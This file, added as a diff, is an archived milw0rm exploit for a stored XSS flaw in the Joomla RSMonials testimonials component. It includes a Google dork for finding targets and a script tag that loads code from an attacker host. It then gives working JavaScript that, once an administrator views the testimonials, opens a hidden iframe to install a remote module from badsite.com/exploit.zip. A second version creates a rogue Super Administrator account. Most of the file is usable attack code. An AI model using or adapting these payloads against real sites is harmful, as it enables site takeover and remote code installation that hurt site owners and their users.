@@ -1,0 +1,91 @@
+/*
+RSMonials XSS Exploit
+
+http://www.rswebsols.com/downloads/category/14-download-rsmonials-all?download=23%3Adownload-rsmonials-component
+
+Google Dork: allinurl:option=com_rsmonials
+
+Anything entered into the form gets rendered as HTML, so you can add tags
+as long as they don't include quotes (magic quotes eats them, if it's on).
+This component ships with settings that prevent posting by default, but 
+the administrator page for the testimonials renders your script in its entirety.
+
+Proof of Concept 1: Remote file upload
+
+Visit http://target.com/index.php?option=com_rsmonials and post a comment.
+At the end of your glowing comment about how awesome the site is, attach this:
+
+<script src=http://badsite.com/evil.js></script>
+
+Now, when your admin goes to the com_rsmonials "Testimonials" page, your 
+script will execute. In this example, a hidden iframe loads up the install
+page and installs a 'custom' module.
+
+*/
+
+var exploited = false;
+var iframe = document.createElement( 'iframe' );
+var reg = new RegExp( 'administrator' );
+if( reg.test( location.href ) )
+{
+	iframe.src = 'index.php?option=com_installer';
+	iframe.setStyle( 'display', 'none' );
+	document.body.appendChild( iframe );
+	iframe.addEvent( 'load', exploit );
+}
+function exploit( e )
+{
+	if( exploited != true )
+	{
+		var doc = e.target.contentDocument; if( !doc ) return;
+		var inp = doc.getElementById( 'install_url' );
+		inp.value = 'http://badsite.com/exploit.zip';
+		var b = inp.parentNode.getElementsByTagName( 'input' )[1];
+		b.onclick();
+		exploited = true;
+	}
+}
+
+/*
+
+Proof of Concept 2: New Super Administrator
+
+Here's a drop-in replacement for the 'exploit' function above:
+
+function exploit( e )
+{
+	if( exploited != true )
+	{
+		var newForm = false;
+		var doc = e.target.contentDocument; if( !doc ) return;
+		var nb = doc.getElementsByTagName( 'a' ); if( !nb ) return;
+		var i = 0;
+		for( ; i<nb.length; i++ )
+		{
+			if( nb[i].parentNode.id == 'toolbar-new' )
+			{
+				nb[i].onclick();
+			}
+			else if( nb[i].parentNode.id == 'toolbar-save' )
+			{
+				doc.getElementById( 'name' ).value = 'hacked';
+				doc.getElementById( 'username' ).value = 'hacked';
+				doc.getElementById( 'email' ).value = 'your@freemail.com';
+				doc.getElementById( 'password' ).value = 'password';
+				doc.getElementById( 'password2' ).value = 'password';
+				var g = doc.getElementById( 'gid' );
+				g.selectedIndex = g.options.length - 1;
+				nb[i].onclick();
+				exploited = true;
+			}
+		}
+	}
+}
+
+If the admin is a Super Admin, then you could be too... just remember to watch
+your freemail account for Joomla's account notification!
+
+*/
+/* jdc 2009 */
+
+# milw0rm.com [2009-04-22]
